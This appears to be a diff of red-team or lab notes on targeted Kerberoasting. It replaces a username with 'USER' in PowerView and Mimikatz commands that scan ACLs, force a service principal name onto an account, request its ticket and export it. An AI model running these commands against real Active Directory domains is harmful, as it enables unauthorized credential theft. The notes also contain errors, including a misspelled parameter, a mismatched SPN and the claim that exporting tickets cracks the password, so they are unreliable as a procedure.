@@ -6,11 +6,11 @@ We can then request a TGS without special privileges. The TGS can then be "Kerbe
 
 Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
 
-Get-DomainUser -Dentity Support71User | select serviceprincipalname
+Get-DomainUser -Dentity USER | select serviceprincipalname
 
 --now force set
 
-Set-DomainObject -Identity Support71User -Set @{serviceprincipalname='ops/seventyone'}
+Set-DomainObject -Identity USER -Set @{serviceprincipalname='ops/seventyone'}
 
 --Request a ticket
 
@@ -24,4 +24,4 @@ Request-SPNTicket
 
 now running klist would show opt/seventyone
 
-running Invoke-Mimikatz -Command '"kerberos::list /export"' would crack the password for Support71User
+running Invoke-Mimikatz -Command '"kerberos::list /export"' would crack the password for USER
